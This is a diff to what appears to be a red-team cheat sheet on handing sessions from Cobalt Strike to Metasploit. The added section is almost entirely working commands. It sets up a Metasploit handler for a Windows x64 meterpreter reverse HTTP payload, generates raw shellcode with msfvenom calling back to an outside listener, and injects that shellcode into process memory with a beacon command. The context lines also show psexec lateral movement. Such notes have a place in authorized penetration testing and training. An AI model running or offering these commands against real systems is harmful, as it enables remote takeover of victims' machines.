@@ -20,3 +20,19 @@
 # Use Jump psexec to execute the beacon payload and pass the session
 
     beacon> jump psexec Foreign_listener
+
+## CASE 3: Shellcode Injection (From CS to Metasploit - Stageless Payload)
+
+# Setup up metasploit
+
+    msf6 > use exploit/multi/handler
+    msf6 exploit(multi/handler) > set payload windows/x64/meterpreter_reverse_http
+    msf6 exploit(multi/handler) > exploit
+
+# Generate binary
+
+    ubuntu@DESKTOP-3BSK7NO ~> msfvenom -p windows/x64/meterpreter_reverse_http LHOST=10.10.5.50 LPORT=8080 -f raw -o /mnt/c/Payloads/msf_http_x64.bin
+
+# Inject msf shellcode into process memory
+
+    beacon> shspawn x64 C:\Payloads\msf_http_x64.bin
